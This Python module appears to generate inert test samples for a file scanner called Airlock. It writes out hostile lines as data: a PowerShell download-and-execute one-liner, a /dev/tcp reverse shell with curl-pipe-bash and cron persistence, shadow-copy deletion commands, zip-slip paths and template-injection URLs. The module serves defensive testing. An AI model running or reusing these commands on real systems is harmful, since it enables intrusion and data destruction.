"""Synthetic sample generator.

Airlock needs files that *look like* the things it claims to detect, and a
security tool that ships real malware to test itself is a liability. Every
sample here is built from scratch, is inert, and contains no payload: the
"suspicious" PE imports dangerous APIs but its code section is int3 padding;
the obfuscated script decodes to an echo.

Used by the test suite and by ``airlock selftest``.
"""

from __future__ import annotations

import io
import struct
import zipfile
from pathlib import Path

# --------------------------------------------------------------------------
# PE construction
# --------------------------------------------------------------------------
SECTION_ALIGN = 0x1000
FILE_ALIGN = 0x200
HEADERS_SIZE = 0x400


def _build_import_blob(base_rva: int, imports: dict[str, list[str]]) -> bytes:
    """Serialise a PE32+ import directory rooted at ``base_rva``."""
    desc_size = (len(imports) + 1) * 20
    body = bytearray()

    def add(data: bytes) -> int:
        offset = len(body)
        body.extend(data)
        if len(body) % 2:
            body.append(0)
        return offset

    def rva(offset: int) -> int:
        return base_rva + desc_size + offset

    descriptors = bytearray()
    for dll, funcs in imports.items():
        dll_off = add(dll.encode() + b"\x00")
        name_rvas = [rva(add(struct.pack("<H", 0) + f.encode() + b"\x00")) for f in funcs]
        thunks = b"".join(struct.pack("<Q", r) for r in name_rvas) + struct.pack("<Q", 0)
        thunk_off = add(thunks)
        descriptors += struct.pack(
            "<IIIII", rva(thunk_off), 0, 0, rva(dll_off), rva(thunk_off))
    descriptors += b"\x00" * 20
    return bytes(descriptors) + bytes(body)


def build_pe(
    imports: dict[str, list[str]] | None = None,
    *,
    dll_characteristics: int = 0x0140,  # DYNAMIC_BASE | NX_COMPAT
    extra_sections: list[tuple[str, bytes, int]] | None = None,
    timestamp: int = 0x60000000,
    text_body: bytes = b"",
    overlay: bytes = b"",
    entry_rva: int = 0x1000,
) -> bytes:
    """Assemble a structurally valid, inert PE32+ image.

    The result parses correctly in real PE tooling. It does not run: the code
    section is breakpoint padding and there is no relocation or runtime setup.
    """
    imports = imports or {}
    extra_sections = extra_sections or []

    text = (text_body or b"\xcc" * 32).ljust(FILE_ALIGN, b"\x00")
    rdata_rva = SECTION_ALIGN * 2
    rdata = _build_import_blob(rdata_rva, imports) if imports else b"\x00" * 16
    rdata = rdata.ljust(((len(rdata) + FILE_ALIGN - 1) // FILE_ALIGN) * FILE_ALIGN, b"\x00")

    sections: list[tuple[str, bytes, int, int]] = [
        (".text", text, SECTION_ALIGN, 0x60000020),          # R-X, code
        (".rdata", rdata, rdata_rva, 0x40000040),            # R--, initialised data
    ]
    next_rva = rdata_rva + SECTION_ALIGN
    for name, body, flags in extra_sections:
        padded = body.ljust(((len(body) + FILE_ALIGN - 1) // FILE_ALIGN) * FILE_ALIGN, b"\x00")
        sections.append((name, padded, next_rva, flags))
        next_rva += max(SECTION_ALIGN, ((len(padded) + SECTION_ALIGN - 1) // SECTION_ALIGN) * SECTION_ALIGN)

    e_lfanew = 0x80
    dos = bytearray(e_lfanew)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", e_lfanew)
    stub = b"This program cannot be run in DOS mode."
    dos[0x40:0x40 + len(stub)] = stub  # where the DOS stub would live
    assert len(dos) == e_lfanew, "DOS header length must not move e_lfanew"

    coff = struct.pack("<HHIIIHH", 0x8664, len(sections), timestamp, 0, 0, 0xF0, 0x0022)

    opt = bytearray(0xF0)
    struct.pack_into("<H", opt, 0, 0x20B)                    # PE32+
    struct.pack_into("<BB", opt, 2, 14, 0)                   # linker version
    struct.pack_into("<I", opt, 4, len(text))                # SizeOfCode
    struct.pack_into("<I", opt, 16, entry_rva)               # AddressOfEntryPoint
    struct.pack_into("<I", opt, 20, SECTION_ALIGN)           # BaseOfCode
    struct.pack_into("<Q", opt, 24, 0x140000000)             # ImageBase
    struct.pack_into("<I", opt, 32, SECTION_ALIGN)
    struct.pack_into("<I", opt, 36, FILE_ALIGN)
    struct.pack_into("<H", opt, 48, 6)                       # MajorSubsystemVersion
    struct.pack_into("<I", opt, 56, next_rva)                # SizeOfImage
    struct.pack_into("<I", opt, 60, HEADERS_SIZE)            # SizeOfHeaders
    struct.pack_into("<H", opt, 68, 3)                       # console subsystem
    struct.pack_into("<H", opt, 70, dll_characteristics)
    struct.pack_into("<I", opt, 108, 16)                     # NumberOfRvaAndSizes
    if imports:
        struct.pack_into("<II", opt, 112 + 8 * 1, rdata_rva, len(rdata))

    table = bytearray()
    raw_ptr = HEADERS_SIZE
    for name, body, vaddr, flags in sections:
        table += name.encode().ljust(8, b"\x00")
        table += struct.pack("<IIII", max(len(body), 0x10), vaddr, len(body), raw_ptr)
        table += struct.pack("<IIHH", 0, 0, 0, 0)
        table += struct.pack("<I", flags)
        raw_ptr += len(body)

    header = bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(table)
    if len(header) > HEADERS_SIZE:
        raise ValueError("section table overflowed the header region")
    image = header.ljust(HEADERS_SIZE, b"\x00")
    return image + b"".join(body for _n, body, _v, _f in sections) + overlay


# --------------------------------------------------------------------------
# Named samples
# --------------------------------------------------------------------------
def benign_pe() -> bytes:
    """An ordinary console utility: small import table, mitigations enabled."""
    return build_pe({
        "KERNEL32.dll": ["GetStdHandle", "WriteFile", "ExitProcess", "GetLastError",
                         "CreateFileW", "CloseHandle", "ReadFile", "SetFilePointer",
                         "GetCommandLineW", "HeapAlloc", "HeapFree", "GetProcessHeap"],
        "msvcrt.dll": ["printf", "malloc", "free", "memcpy", "strlen"],
    }, dll_characteristics=0x0160)  # HIGH_ENTROPY_VA | DYNAMIC_BASE | NX_COMPAT


def injector_pe() -> bytes:
    """Imports the injection + evasion + persistence stack, with a W+X section.

    Inert: the imports are declared, never called.
    """
    return build_pe({
        "KERNEL32.dll": [
            "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
            "VirtualProtectEx", "SetThreadContext", "ResumeThread", "LoadLibraryA",
            "GetProcAddress", "VirtualAlloc", "VirtualProtect", "IsDebuggerPresent",
            "GetTickCount", "OutputDebugStringA", "CreateToolhelp32Snapshot",
            "Process32First", "Process32Next", "GetComputerNameA", "GetSystemInfo",
        ],
        "ADVAPI32.dll": [
            "RegCreateKeyExA", "RegSetValueExA", "OpenProcessToken",
            "AdjustTokenPrivileges", "LookupPrivilegeValueA", "CreateServiceA",
        ],
        "ntdll.dll": ["NtQueryInformationProcess", "NtUnmapViewOfSection", "NtQueueApcThread"],
    },
        dll_characteristics=0x0000,  # no ASLR, no DEP, no CFG
        extra_sections=[
            # Writable *and* executable, filled with high-entropy bytes.
            (".rwx", bytes(_lcg_bytes(0x2000)), 0xE0000060),
        ],
        timestamp=0)


def ransomware_like_pe() -> bytes:
    """Crypto APIs plus shadow-copy deletion plus a .onion address."""
    strings = (
        b"vssadmin delete shadows /all /quiet\x00"
        b"wbadmin delete catalog -quiet\x00"
        b"bcdedit /set {default} recoveryenabled No\x00"
        b"http://xhqerdpbtkvzwl3nrqjmuf5cgdnbsyq7ai2ovzkm4cbx6yqd.onion/pay\x00"
        b"All your files have been encrypted.\x00"
        b"README_RESTORE_FILES.txt\x00"
    )
    return build_pe({
        "KERNEL32.dll": ["FindFirstFileW", "FindNextFileW", "CreateFileW", "WriteFile",
                         "ReadFile", "DeleteFileW", "MoveFileW", "CloseHandle"],
        "ADVAPI32.dll": ["CryptAcquireContextW", "CryptGenKey", "CryptEncrypt",
                         "CryptDeriveKey", "CryptDestroyKey", "CryptGenRandom"],
        "SHELL32.dll": ["ShellExecuteW"],
    },
        extra_sections=[(".data", strings.ljust(0x400, b"\x00"), 0xC0000040)])


def packed_pe() -> bytes:
    """UPX-style section naming with a high-entropy body and no real imports."""
    return build_pe({"KERNEL32.dll": ["LoadLibraryA", "GetProcAddress", "VirtualAlloc"]},
                    extra_sections=[
                        ("UPX0", b"\x00" * 0x200, 0xE0000080),
                        ("UPX1", bytes(_lcg_bytes(0x4000)), 0xE0000040),
                    ])


def pe_with_appended_zip() -> bytes:
    """A polyglot: valid PE with an archive glued onto the end."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        # Stored, not deflated, so the appended region is large and high-entropy
        # -- the shape of a real second stage rather than a compressible stub.
        zf.writestr("stage2.bin", _lcg_bytes(96 * 1024))
    return benign_pe() + buf.getvalue()


def eicar() -> bytes:
    """The EICAR anti-malware test string, assembled at runtime.

    EICAR is a harmless 68-byte COM file that every scanner is expected to
    detect. It is built here rather than committed so that checking out this
    repository does not trip the reader's own antivirus.
    """
    return (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
            b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
            b"$H+H*")


def obfuscated_powershell() -> bytes:
    """Base64 -EncodedCommand wrapping an inert payload.

    The decoded layer is ``Write-Output 'airlock test'`` preceded by the
    download-and-execute idiom as a string, so the recursive script analyser has
    something real to find without anything real to run.
    """
    import base64
    inner = ("$c = New-Object Net.WebClient; "
             "$d = $c.DownloadString('http://example.invalid/stage2.ps1'); "
             "IEX $d; Write-Output 'airlock test'")
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    return (
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden "
        f"-ExecutionPolicy Bypass -EncodedCommand {encoded}\n"
    ).encode()


def reverse_shell_script() -> bytes:
    return (
        b"#!/bin/bash\n"
        b"# inert sample: the socket line is quoted, not executed\n"
        b"echo 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'\n"
        b"curl -fsSL http://example.invalid/install.sh | bash\n"
        b"(crontab -l 2>/dev/null; echo '@reboot /tmp/.x') | crontab -\n"
        b"history -c\n"
    )


def zip_slip() -> bytes:
    """An archive whose entry names escape the extraction directory."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("readme.txt", b"ordinary file\n")
        zf.writestr("../../../../etc/cron.d/airlock-test", b"# would land outside\n")
        zf.writestr("..\\..\\Windows\\System32\\drivers\\etc\\hosts", b"# windows variant\n")
    return buf.getvalue()


def zip_bomb(ratio_target: int = 4000) -> bytes:
    """A small archive holding a very compressible entry."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr("payload.bin", b"\x00" * (ratio_target * 4096))
    return buf.getvalue()


def archive_with_hidden_executable() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Invoice/Invoice_4471.pdf", b"%PDF-1.5\n% inert\n")
        zf.writestr("Invoice/.hidden/update.exe", benign_pe())
        zf.writestr("Invoice/Invoice_4471.pdf\u202egpj.scr", b"MZ\x00\x00")
    return buf.getvalue()


def password_protected_archive() -> bytes:
    """An archive whose entries are marked encrypted.

    Built by flipping the general-purpose bit-0 flag in both the local and
    central headers, because ``zipfile.writestr`` refuses to write that flag --
    it will not produce an entry it cannot itself read back.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("invoice.exe", b"MZ" + b"\x00" * 512)
        zf.writestr("readme.txt", b"password: infected\n")
    raw = bytearray(buf.getvalue())
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        pos = 0
        while (pos := raw.find(signature, pos)) != -1:
            raw[pos + flag_offset] |= 0x01
            pos += 4
    return bytes(raw)


def macro_document() -> bytes:
    """A minimal OOXML package carrying a VBA project."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",
                    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/>'
                    '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
                    "</Types>")
        zf.writestr("_rels/.rels",
                    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
                    'openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
                    'Target="word/document.xml"/></Relationships>')
        zf.writestr("word/document.xml",
                    '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/'
                    'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Enable editing to view '
                    "this document.</w:t></w:r></w:p></w:body></w:document>")
        # Inert placeholder standing in for a compiled VBA project stream.
        zf.writestr("word/vbaProject.bin",
                    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512 +
                    b"A\x00u\x00t\x00o\x00O\x00p\x00e\x00n\x00" + b"\x00" * 64)
    return buf.getvalue()


def template_injection_docx() -> bytes:
    """A macro-free document that pulls its template from a remote server.

    This is the shape that gets past "does it have macros?" checks: the payload
    is not in the file, it is at the other end of the relationship URL.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",
                    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/content-types"><Default Extension="xml" '
                    'ContentType="application/xml"/></Types>')
        zf.writestr("_rels/.rels",
                    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
                    'openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
                    'Target="word/document.xml"/></Relationships>')
        zf.writestr("word/document.xml",
                    '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/'
                    'wordprocessingml/2006/main"><w:body/></w:document>')
        zf.writestr("word/_rels/settings.xml.rels",
                    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                    'package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
                    'openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                    'Target="http://example.invalid/payload.dotm" TargetMode="External"/>'
                    "</Relationships>")
    return buf.getvalue()


def pdf_with_javascript() -> bytes:
    """A PDF with an OpenAction that runs JavaScript, plus a hex-escaped name."""
    return (
        b"%PDF-1.7\n"
        b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R/AA<</O 4 0 R>>>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
        b"4 0 obj<</S/JavaScript/#4A#53(app.alert\\('airlock test'\\);)>>endobj\n"
        b"5 0 obj<</Type/Filespec/F(stage2.exe)/EF<</F 6 0 R>>>>endobj\n"
        b"6 0 obj<</Type/EmbeddedFile/Length 4>>stream\nMZ\x00\x00\nendstream endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )


def benign_text() -> bytes:
    return (b"Airlock sample: ordinary notes file.\n"
            b"Nothing here should score above INFO.\n") * 8


def benign_pdf() -> bytes:
    return (
        b"%PDF-1.4\n"
        b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
        b"trailer<</Root 1 0 R>>\n%%EOF\n"
    )


def _lcg_bytes(n: int) -> bytes:
    """Deterministic pseudo-random bytes -- high entropy, byte-identical across
    runs so tests and fixtures stay reproducible."""
    out = bytearray(n)
    state = 0x2545F4914F6CDD1D
    for i in range(n):
        state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
        out[i] = (state >> 33) & 0xFF
    return bytes(out)


#: name -> (builder, expected verdict under the default "standard" policy).
#: The expectation is what the test suite and ``airlock selftest`` assert, so
#: adding a sample here adds a regression test. These are ground truth: if a
#: change to a heuristic moves one of these, that is the change being wrong
#: until argued otherwise.
CATALOGUE: dict[str, tuple] = {
    "notes.txt": (benign_text, "ALLOW"),
    "report.pdf": (benign_pdf, "ALLOW"),
    "hello-cli.exe": (benign_pe, "WARN"),
    "eicar.com": (eicar, "MALICIOUS"),
    "Invoice_4471.pdf.exe": (lambda: build_pe({"KERNEL32.dll": ["ExitProcess"]}), "QUARANTINE"),
    "quarterly-results.pdf": (injector_pe, "MALICIOUS"),
    "updater.exe": (injector_pe, "MALICIOUS"),
    "locker.exe": (ransomware_like_pe, "MALICIOUS"),
    "installer.exe": (packed_pe, "QUARANTINE"),
    "polyglot.exe": (pe_with_appended_zip, "WARN"),
    "update.ps1": (obfuscated_powershell, "MALICIOUS"),
    "setup.sh": (reverse_shell_script, "MALICIOUS"),
    "backup.zip": (zip_slip, "QUARANTINE"),
    "compressed.zip": (zip_bomb, "QUARANTINE"),
    "Invoice.zip": (archive_with_hidden_executable, "MALICIOUS"),
    "timesheet.docm": (macro_document, "WARN"),
    "contract.docx": (template_injection_docx, "MALICIOUS"),
    "statement.pdf": (pdf_with_javascript, "MALICIOUS"),
}


def write_samples(directory: Path) -> dict[str, Path]:
    """Materialise the whole catalogue into ``directory``."""
    directory.mkdir(parents=True, exist_ok=True)
    written: dict[str, Path] = {}
    for name, (builder, _expected) in CATALOGUE.items():
        path = directory / name
        path.write_bytes(builder())
        path.chmod(0o600)
        written[name] = path
    return written
